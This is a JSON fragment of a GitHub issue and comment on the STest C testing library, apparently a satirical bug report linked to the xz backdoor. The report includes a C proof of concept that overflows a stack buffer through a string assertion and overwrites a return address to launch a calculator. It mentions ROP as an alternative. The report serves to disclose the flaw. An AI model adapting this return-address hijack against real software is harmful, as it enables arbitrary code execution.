If the library is used to test untrusted input (for example, a file you found in [tukaani-project/xz](https://github.com/tukaani-project/xz)) a devious individual would be able to construct a malicious file to achieve arbitrary code execution on anyone running the tests.\r\n\r\nI have included an example of how it might look on x86_64 Linux. Here as an example I hijack the return to go to a predefined function, but of course you could ROP instead.\r\n\r\n```c\r\n#include \"../src/stest.h\"\r\n#include <stdint.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <stddef.h>\r\n#include <memory.h>\r\n\r\n#define without_logging(X) stest_disable_logging(); X; stest_enable_logging();\r\n#define assert_test_passes(X) without_logging(X); stest_assert_last_passed(__FUNCTION__, __LINE__);\r\n#define assert_test_fails(X) without_logging(X); stest_assert_last_failed(__FUNCTION__, __LINE__);\r\n\r\nstatic void example() {\r\n  execl(\"/usr/bin/gnome-calculator\", \"gnome-calculator\", NULL);\r\n}\r\n\r\nstatic void test_stack_nuke() {\r\n  // E.g. read a wholesome file provided kindly by the XZ maintainer\r\n  static char untrusted_input[10100] = {0};\r\n  memset(untrusted_input, 'A', 10000);\r\n  *(uint64_t*)&untrusted_input[10000] = example;\r\n\r\n  // What could go wrong\r\n  assert_test_fails(assert_string_equal(NULL, untrusted_input));\r\n}\r\n\r\nvoid test_fixture_stest() {\r\n  test_fixture_start();\r\n  run_test(test_stack_nuke);\r\n  test_fixture_end();\r\n}\r\n\r\nint main(int argc, char **argv) {\r\n  return stest_testrunner(argc, argv, test_fixture_stest, NULL, NULL);\r\n}\r\n```\r\n\r\nI trust you will fix this issue promptly, I am sure security is a high priority.","reactions":{"url":"https://api.github.com/repos/JiaT75/STest/issues/11/reactions","total_count":98,"+1":0,"-1":0,"laugh":70,"hooray":11,"confused":0,"heart":4,"rocket":8,"eyes":5},"timeline_url":"https://api.github.com/repos/JiaT75/STest/issues/11/timeline","performed_via_github_app":null,"state_reason":null},"comment":{"url":"https://api.github.com/repos/JiaT75/STest/issues/comments/2041018527","html_url":"https://github.com/JiaT75/STest/issues/11#issuecomment-2041018527","issue_url":"https://api.github.com/repos/JiaT75/STest/issues/11","id":2041018527,"node_id":"IC_kwDOGhl8Oc55p3if","user":{"login":"nb-programmer","id":46126206,"node_id":"MDQ6VXNlcjQ2MTI2MjA2","avatar_url":"https://avatars.githubusercontent.com/u/46126206?v=4","gravatar_id":"","url":"https://api.github.com/users/nb-programmer","html_url":"https://github.com/nb-programmer","followers_url":"https://api.github.com/users/nb-programmer/followers","following_url":"https://api.github.com/users/nb-programmer/following{/other_user}","gists_url":"https://api.github.com/users/nb-programmer/gists{/gist_id}","starred_url":"https://api.github.com/users/nb-programmer/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/nb-programmer/subscriptions","organizations_url":"https://api.github.com/users/nb-programmer/orgs","repos_url":"https://api.github.com/users/nb-programmer/repos","events_url":"https://api.github.com/users/nb-programmer/events{/privacy}","received_events_url":"https://api.github.com/users/nb-programmer/received_events","type":"User","site_admin":false},"created_at":"2024-04-06T08:38:12Z","updated_at":"2024-04-06T08:38:12Z","author_association":"NONE","body":"Don't worry, we'll just raise a PR in oss-fuzz to skip checking for stack buffer overflow in this repo :)","reactions":{"url":"https://api.github.com/repos/JiaT75/STest/issues/comments/2041018527/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"performed_via_github_app":null}},"public":true,"created_at":"2024-04-06T08:38:13Z"}
